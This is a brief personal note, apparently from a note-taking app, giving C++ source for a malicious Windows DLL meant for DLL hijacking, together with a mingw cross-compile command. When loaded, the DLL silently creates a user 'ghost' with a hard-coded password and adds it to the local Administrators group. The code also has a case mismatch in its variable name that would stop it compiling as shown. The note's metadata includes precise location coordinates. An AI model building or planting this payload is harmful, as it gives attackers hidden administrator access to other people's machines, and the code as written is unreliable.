---
title: DLL Hijacking code
updated: 2025-05-03 14:01:15Z
created: 2025-05-03 13:51:19Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

myDLL.cpp
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,//Reason for calling function
LPVOID lpReserved ) // Reserved
{
	switch ( Ul_reason_for_call )
	{
		case DLL_PROCESS_ATTACH: // A process is loading the DLL.
		int i;
			i = system ("net user ghost Pa55w0rd123! /add");
			i = system ("net localgroup administrators ghost /add");
		break;
		case DLL_THREAD_ATTACH: // A process is creating a new thread.
		break;
		case DLL_THREAD_DETACH: // A thread exits normally.
		break;
		case DLL_PROCESS_DETACH: // A process unloads the DLL.
		break;
	}
	return TRUE;
}
```

**Cross-compile the code:**
`x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`
